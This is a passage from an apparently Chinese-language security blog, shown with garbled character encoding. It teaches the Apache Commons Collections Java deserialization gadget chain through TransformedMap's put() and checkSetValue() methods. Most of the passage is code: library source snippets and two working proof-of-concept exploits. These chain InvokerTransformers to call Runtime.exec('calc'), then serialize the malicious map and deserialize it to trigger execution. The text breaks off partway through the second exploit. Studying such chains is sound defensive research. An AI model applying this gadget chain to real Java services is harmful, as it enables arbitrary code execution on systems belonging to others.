<h4 id="ç¬¬å››æ­¥ï¼šTransformedMap-put"><a href="#ç¬¬å››æ­¥ï¼šTransformedMap-put" class="headerlink" title="ç¬¬å››æ­¥ï¼šTransformedMap - put()"></a>ç¬¬å››æ­¥ï¼šTransformedMap - put()</h4><blockquote>
<p><code>Apache Commons Collections</code> å®ç°äº†ä¸€ä¸ª <code>TransformedMap</code> ç±»ï¼Œè¯¥ç±»æ˜¯å¯¹ Java æ ‡å‡†æ•°æ®ç»“æ„ <code>Map</code> æ¥å£çš„ä¸€ä¸ªæ‰©å±• ã€‚</p>
</blockquote>
<p>åœ¨<code>TransformedMap</code>ç±»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä»¥ä¸‹methods</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">   <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">transformKey</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>keyTransformer <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> object <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>keyTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token comment">//è‹¥keyTransformerä¸ä¸ºnullï¼Œåˆ™æ‰§è¡Œå…¶transformæ–¹æ³•</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">transformValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> object <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token comment">//è‹¥valueTransformerä¸ä¸ºnullï¼Œåˆ™æ‰§è¡Œå…¶transformæ–¹æ³•</span>
   <span class="token punctuation">&#125;</span>    
<span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">checkSetValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ä¸‰ä¸ªmethodséƒ½ä¼šè°ƒç”¨åˆ°å¯¹è±¡çš„<code>transform</code>()æ–¹æ³•ï¼Œä½†éƒ½æ˜¯<code>protected</code>å±æ€§ï¼Œæ— æ³•è¢«å¤–ç•Œè®¿é—®ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆè§¦å‘åˆ°è¿™ä¸‰ä¸ªæ–¹æ³•å‘¢ï¼Ÿ</p>
<p>ç»§ç»­åœ¨è¯¥Classä¸­æŸ¥çœ‹ï¼Œå‘ç°äº†<code>put()</code>æ–¹æ³•ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//å¦‚æœä½¿ç”¨äº†putæ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œtransformæ–¹æ³•</span>
    key <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">transformKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œè°ƒç”¨äº†æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„æ–¹æ³•</span>
    value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">transformValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œè°ƒç”¨äº†æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„æ–¹æ³•</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é‚£<code>keyTransformer</code>å’Œ<code>valueTransformer</code>å¯æ§å—ï¼Ÿ</p>
<p><code>TransformedMap</code>ç±»ä¸­çš„constructorä¼ å…¥ä¸¤ä¸ªè½¬æ¢é“¾ï¼Œä¸€ä¸ªæ˜¯<code>keyTransformer</code>ä¸€ä¸ªæ˜¯<code>valueTransformer</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> keyTransformer<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>keyTransformer <span class="token operator">=</span> keyTransformer<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer <span class="token operator">=</span> valueTransformer<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è€Œå®ƒçš„<code>decorate()</code>é™æ€æ–¹æ³•ä¼šè¿”å›æ–°çš„<code>TransformedMap</code>å®ä¾‹</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> keyTransformer<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> keyTransformer<span class="token punctuation">,</span> valueTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>TransformedMap.decorate()</code>æ¥è·å–åˆ°ä¸€ä¸ªæ–°çš„<code>TransformedMap Instance</code></p>
<p><strong>POCï¼š</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
        * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
        * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> myMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//final malicious map</span>

        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>myMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
        * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
        * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> mapObj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//è§¦å‘æ¼æ´</span>
        mapObj<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">,</span><span class="token string">"bb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è®¡ç®—å™¨æˆåŠŸå¼¹å‡ºï¼</p>
<p>ç°åœ¨èŒƒå›´æ‰©å¤§äº†ï¼Œå› ä¸ºæˆ‘ä»¬ç”¨åˆ°äº†æ›´ä¸ºå¸¸è§çš„Mapå’Œ<code>put()</code>è§¦å‘ã€‚</p>
<p>æˆ‘ä»¬æ›´ç†æƒ³åŒ–çš„æ”»å‡»æ–¹å¼æ˜¯ï¼ŒæœåŠ¡å™¨ç«¯åªè¦ååºåˆ—åŒ–<code>readObject()</code>å°±èƒ½è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚å¯æƒœçš„æ˜¯ï¼Œå®‰å…¨ç ”ç©¶çš„å‰è¾ˆä»¬å‘ç°å¹¶æœªæœ‰ã€é‡å†™äº†<code>readObject()</code>æ–¹æ³•ä¸”æ–¹æ³•å†…å¯ä»¥è°ƒç”¨<code>MapObj.put()</code>æ–¹æ³•ã€‘çš„Classã€‚</p>
<h4 id="ç¬¬äº”æ­¥ï¼šTransformedMap-checkSetValue"><a href="#ç¬¬äº”æ­¥ï¼šTransformedMap-checkSetValue" class="headerlink" title="ç¬¬äº”æ­¥ï¼šTransformedMap - checkSetValue()"></a>ç¬¬äº”æ­¥ï¼šTransformedMap - checkSetValue()</h4><p>è¿˜è®°å¾—ç¬¬å››æ­¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨<code>TransformedMap</code>ç±»ä¸­è¿˜å‘ç°äº†ä¸€ä¸ªæ–¹æ³•ï¼Œä½†<strong>å¹¶æœªåˆ©ç”¨</strong>å—ï¼Ÿ</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">checkSetValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æ—¢ç„¶<code>put()</code>ä¸å¯ä»¥å†è¿›ä¸€æ­¥åˆ©ç”¨äº†ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šä¸ä¼šæœ‰æ›´å¤šåˆ©ç”¨ç©ºé—´å‘¢ï¼Ÿ<code>TransformedMap</code>ç±»ç»§æ‰¿äº†<code>AbstractInputCheckedMapDecorator</code>ç±»ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹ä¸€ä¸‹ã€‚æœç´¢<code>checkSetValue()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222403673.png" alt="image-20210731222403673" loading="lazy"></p>
<p>è¿™é‡Œ<code>MapEntry</code>é‡Œå‡ºç°äº†<code>checkSetValue()</code>ï¼Œé‚£æˆ‘ä»¬åªè¦ä¿è¯<code>this.parent</code>æ˜¯æŒ‡å‘<code>TransformedMap</code>ç±»çš„å¯¹è±¡å°±å¯ä»¥äº†ã€‚</p>
<p>æˆ‘ä»¬çœ‹çœ‹<code>this.parent</code>éƒ½åœ¨å“ªäº›åœ°æ–¹å¯ä»¥è¢«èµ‹å€¼å‘¢ï¼Ÿ</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222703200.png" alt="image-20210731222703200" loading="lazy"></p>
<p>åˆ†åˆ«æ˜¯åœ¨<code>EntrySetIterator</code>å’Œ<code>EntrySet</code>çš„<code>constructor</code>é‡Œå¯ä»¥è¢«èµ‹å€¼ï¼ä½†è¿™æ˜¯<strong>ä¸åŒ</strong>Classçš„<code>parent</code>ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯<code>MapEntry</code>é‡Œçš„<code>parent</code>ï¼Œç»§ç»­æŸ¥çœ‹ä»£ç ï¼Œå‘ç°ï¼š<code>EntrySetIterator</code>ä¸­çš„next()æ–¹æ³•ä¼šå°†è‡ªèº«çš„<code>parent</code>ä¼ å…¥<code>MapEntry</code>ï¼Œè€Œ<code>EntrySet</code>çš„<code>iterator</code>æ–¹æ³•åˆä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„<code>EntrySetIterator</code>ï¼Œå°†å®ƒçš„parentä¼ å…¥<code>EntrySetIterator</code>ï¼Œè¿™æ ·å°±è¿èµ·æ¥äº† - <code>new EntrySet(set,parent).iterator().next()</code>å°±èƒ½å¤Ÿä¼ å…¥æˆ‘ä»¬çš„parentã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731223154142.png" alt="image-20210731223154142" loading="lazy"></p>
<p>æ¥ç€æˆ‘ä»¬å‘ç°ï¼Œ<code>AbstractInputCheckedMapDecorator</code>é‡Œè¿˜æœ‰ä¸€ä¸ª<code>entrySet()</code>ï¼Œå› ä¸ºæˆ‘ä»¬çš„<code>TransformedMap</code>å°±æ˜¯å®ƒçš„å­ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨æˆ‘ä»¬çš„<code>TransformedMap</code>å»callè¿™ä¸ªmethod,ä¸€åˆ‡å°±è¿èµ·æ¥äº†ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Set</span> <span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Set</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isSetValueChecking</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">AbstractInputCheckedMapDecorator<span class="token punctuation">.</span>EntrySet</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„entrySetï¼ŒæŠŠè‡ªèº«ä½œä¸ºparentä¼ å…¥constructor</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>POCï¼š</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
        * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
        * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> myMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//malicious map</span>
        <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> finalMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">)</span> myMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¼ å…¥parent</span>

        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>finalMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
